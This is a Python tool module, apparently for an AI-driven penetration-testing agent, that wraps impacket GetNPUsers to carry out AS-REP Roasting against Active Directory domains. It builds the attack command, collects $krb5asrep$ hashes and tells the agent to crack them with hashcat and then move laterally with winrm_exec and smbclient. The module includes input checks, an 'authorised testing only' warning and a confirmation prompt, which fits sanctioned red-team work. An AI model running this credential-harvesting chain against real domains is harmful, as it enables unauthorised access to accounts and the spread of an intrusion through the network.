"""GetNPUsers 深度定制：AS-REP Roasting 域渗透（危险操作，触发确认）。"""

from __future__ import annotations

import re
from typing import Any

from .base import ToolProfile, check_installed, sanitize_target

SCHEMAS: list[dict[str, Any]] = [
    {
        "type": "function",
        "function": {
            "name": "asrep_roast",
            "description": (
                "用 impacket GetNPUsers 对域做 AS-REP Roasting："
                "枚举未启用 Kerberos 预认证的账户（UF_DONT_REQUIRE_PREAUTH），"
                "获取可离线破解的 AS-REP hash（$krb5asrep$）。"
                "⚠ 危险操作：会触发确认弹窗。仅授权测试。"
                "拿到的 hash 用 crack_hash 破解（类型选 krb5asrep）。"
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "domain": {"type": "string", "description": "域名，如 corp.local"},
                    "dc": {
                        "type": "string",
                        "description": "域控 IP（可选，默认从 DNS 解析）",
                    },
                    "users": {
                        "type": "string",
                        "description": "用户文件路径（可选，默认自动查询域用户）",
                    },
                    "username": {"type": "string", "description": "绑定用户（可选）"},
                    "password": {"type": "string", "description": "绑定密码（可选）"},
                },
                "required": ["domain"],
            },
        },
    },
]

_CRED_RE = re.compile(r"^[\w.\-\\$]{1,64}$")
_USERFILE_RE = re.compile(r"^/[\w./-]{1,200}$")


def _bin() -> str:
    for name in ("impacket-GetNPUsers", "GetNPUsers.py"):
        if check_installed(name):
            return name
    return ""


def _build_cmd(args: dict[str, Any]) -> tuple[str, int]:
    domain = str(args.get("domain") or "").strip()
    if not re.fullmatch(r"[\w.-]{1,128}", domain):
        raise ValueError(f"domain 格式非法: {domain!r}")
    dc = str(args.get("dc") or "").strip()
    if dc:
        sanitize_target(dc)
    users = str(args.get("users") or "").strip()
    if users and not _USERFILE_RE.match(users):
        raise ValueError(f"users 必须是文件路径: {users!r}")
    username = str(args.get("username") or "").strip()
    password = str(args.get("password") or "").strip()
    if username and not _CRED_RE.match(username):
        raise ValueError(f"username 含非法字符: {username!r}")
    if password and not _CRED_RE.match(password):
        raise ValueError(f"password 含非法字符: {password!r}")

    bin_ = _bin()
    if not bin_:
        return "", 0
    parts = [bin_, "-dc-ip", dc] if dc else [bin_]
    parts.append(f"{domain}/{username or ''}" + (f":{password}" if password else ""))
    if users:
        parts += ["-usersfile", users]
    parts.append("-format hashcat")
    return " ".join(parts), 180


class GetNPUsersProfile(ToolProfile):
    name = "getnpusers"
    aliases = ["asrep", "as-rep roasting", "getnpusers", "预认证"]
    summary = "AS-REP Roasting"
    lore = """### GetNPUsers 深度使用要点
- 定位：域渗透提权第一步（无需任何凭据可尝试）：未启用预认证的账户直接给 AS-REP hash。
- 输出 `$krb5asrep$` hash 用 crack_hash 破解（hashcat -m 18200 / john krb5asrep）。
- 结合 ldap_enum：先查 `(userAccountControl:1.2.840.113556.1.4.803:=4194304)` 找预认证关闭的账户。
- 有凭据时带 -username/-password 查询更全；无凭据时部分域禁止匿名查询。
- 破解出的密码继续用于 winrm_exec / smbclient 横向。"""
    extra_schemas = SCHEMAS

    async def exec_asrep_roast(self, ex: Any, args: dict[str, Any]) -> str:
        if not _bin():
            return "impacket-GetNPUsers 未安装（apt install python3-impacket）。"
        cmd, timeout = _build_cmd(args)
        raw = await self._run(ex, cmd, timeout=timeout)
        hashes = [l.strip() for l in raw.splitlines() if "$krb5asrep$" in l]
        if hashes:
            head = [f"🎯 AS-REP hash ({len(hashes)}):"] + hashes[:10]
            head.append("下一步：crack_hash 破解（类型 krb5asrep），破解后 winrm_exec 横向。")
        else:
            head = ["未获取到 AS-REP hash（可能无预认证关闭账户，或匿名查询被拒）"]
        return self._summary(raw, head, tail=30)
